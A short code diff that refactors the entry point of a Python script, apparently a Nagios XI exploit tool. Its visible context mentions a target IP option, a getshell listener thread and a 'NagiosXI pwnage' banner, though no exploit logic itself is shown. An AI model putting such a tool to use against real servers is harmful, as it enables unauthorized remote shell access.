@@ -71,9 +71,6 @@ class burn():
     self.httpd.server_close()
 
 def main():
-  exploit = burn()
-
-if __name__=="__main__":
   parser = OptionParser() 
    
   parser.add_option("-t", "--target", dest="target", help="[ Requeired ] Target ip address") 
@@ -100,4 +97,5 @@ if __name__=="__main__":
         t3 = threading.Thread(target=getshell(options.lport))
   else:
     print("(m4ud) Magnificent NagiosXI pwnage, use -h for help!!!")
-
+if __name__=="__main__":
+  main()
